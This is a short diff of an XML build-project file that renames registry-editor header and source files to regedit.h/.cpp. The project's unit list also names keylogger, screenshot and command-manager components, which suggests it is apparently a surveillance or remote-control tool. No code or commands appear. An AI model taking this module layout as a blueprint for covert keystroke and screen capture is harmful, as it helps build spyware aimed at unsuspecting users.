@@ -81,8 +81,7 @@
 		<Unit filename="include/methods/screenshot/lodepng.h" />
 		<Unit filename="include/utils/builders.h" />
 		<Unit filename="include/utils/factory.h" />
-		<Unit filename="include/utils/registry/IRegistryEditor.h" />
-		<Unit filename="include/utils/registry/RegistryEditor.h" />
+		<Unit filename="include/utils/registry/regedit.h" />
 		<Unit filename="src/command/CommandManager.cpp" />
 		<Unit filename="src/command/execute/KeyloggerExecuter.cpp" />
 		<Unit filename="src/command/execute/ScreenshotExecuter.cpp" />
@@ -96,7 +95,7 @@
 		<Unit filename="src/methods/screenshot/lodepng.cpp" />
 		<Unit filename="src/utils/builders.cpp" />
 		<Unit filename="src/utils/factory.cpp" />
-		<Unit filename="src/utils/registry/RegistryEditor.cpp" />
+		<Unit filename="src/utils/registry/regedit.cpp" />
 		<Extensions>
 			<code_completion />
 			<envvars />
